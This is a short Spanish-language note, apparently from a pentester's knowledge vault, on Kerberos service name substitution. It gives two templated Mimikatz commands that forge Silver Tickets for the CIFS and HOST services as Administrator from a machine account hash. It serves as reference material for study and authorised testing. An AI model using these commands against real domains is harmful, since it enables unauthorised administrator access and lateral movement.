---
title: Kerberos — Service Name Substitution
tags: [kerberos, silver-ticket, service-name, cobalt-strike]
---

# Service Name Substitution

> [!important] Pendiente de documentar — contenido vacío en el vault original.

## Concepto

Técnica que aprovecha que Kerberos no valida el Service Principal Name (SPN) incluido en el ticket. Se puede **sustituir el nombre del servicio** en un Silver Ticket para acceder a servicios distintos del original.

## Ejemplo

Si tienes el hash NTLM del account de máquina (`COMPUTER$`), puedes crear Silver Tickets para cualquier servicio en esa máquina:

```
# Silver Ticket para CIFS (SMB)
kerberos::golden /sid:<domainSID> /domain:<domain> /ptt /target:<host> /service:cifs /rc4:<ntlm> /user:Administrator

# Silver Ticket para HOST (tareas programadas)
kerberos::golden /sid:<domainSID> /domain:<domain> /ptt /target:<host> /service:host /rc4:<ntlm> /user:Administrator
```

## Ver también
- [[Silver Ticket]]
- [[Kerberos]]
- [[S4U2Self]]
